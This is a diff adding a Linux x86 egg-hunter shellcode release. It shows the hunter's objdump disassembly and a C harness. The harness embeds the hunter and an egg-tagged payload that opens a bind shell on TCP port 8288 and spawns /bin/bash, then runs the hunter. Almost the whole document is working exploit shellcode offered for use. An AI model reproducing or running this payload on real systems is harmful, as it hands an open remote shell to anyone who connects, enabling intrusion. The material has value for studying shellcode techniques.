@@ -1,0 +1,68 @@
+; Filename : egg_hunter.asm
+; Author : M.Acosta <amcx62[_at_]gmail[_dot_]com>
+; Date : 2013 August
+; Location : Lima(Peru)
+; Desc : Linux x86 Egg Hunter
+; References : 
+;       http://www.shell-storm.org/shellcode/files/shellcode-784.php
+;       http://www.exploit-db.com/exploits/17559/
+; Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)
+
+objdump -D -M intel ./egg_hunter
+
+./egg_hunter:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	eb 16                	jmp    8048078 <_hunter>
+
+08048062 <_popeax>:
+ 8048062:	58                   	pop    eax
+
+08048063 <_next>:
+ 8048063:	40                   	inc    eax
+
+08048064 <_isegg>:
+ 8048064:	81 78 f8 53 4c 41 45 	cmp    DWORD PTR [eax-0x8],0x45414c53
+ 804806b:	75 f6                	jne    8048063 <_next>
+ 804806d:	81 78 fc 53 4c 41 45 	cmp    DWORD PTR [eax-0x4],0x45414c53
+ 8048074:	75 ed                	jne    8048063 <_next>
+ 8048076:	ff e0                	jmp    eax
+
+08048078 <_hunter>:
+ 8048078:	e8 e5 ff ff ff       	call   8048062 <_popeax>
+ 
+ #include<stdio.h>
+#include<string.h>
+
+unsigned char egg_hunter[]=\
+"\xeb\x16\x58\x40\x81\x78\xf8\x53\x4c\x41\x45\x75\xf6"
+"\x81\x78\xfc\x53\x4c\x41\x45\x75\xed\xff\xe0\xe8\xe5"
+"\xff\xff\xff";
+
+unsigned char code[] = \
+"\x53\x4c\x41\x45" // Egg start
+"\x53\x4c\x41\x45" // Egg end
+"\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x31\xc9\x89"
+"\xe1\x31\xc0\xb0\x66\xcd\x80\x89\xc6\x31\xdb\xb3\x02"
+"\x31\xc9\x51\x66\x68\x20\x60\x66\x6a\x02\x89\xe1\x6a"
+"\x10\x51\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x31\xdb"
+"\xb3\x04\x6a\x01\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80"
+"\x31\xdb\xb3\x05\x31\xc9\x51\x51\x56\x89\xe1\x31\xc0"
+"\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80"
+"\xfe\xc9\x79\xf8\x31\xc0\x50\x68\x62\x61\x73\x68\x68"
+"\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89"
+"\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";//Shellcode
+
+main()
+{
+	printf("Egg-Hunter Length : %d\n", strlen(egg_hunter));
+	printf("Shellcode Length :  %d\n", strlen(code));
+	
+	int (*ret)() = (int(*)())egg_hunter;
+
+	ret();
+
+}
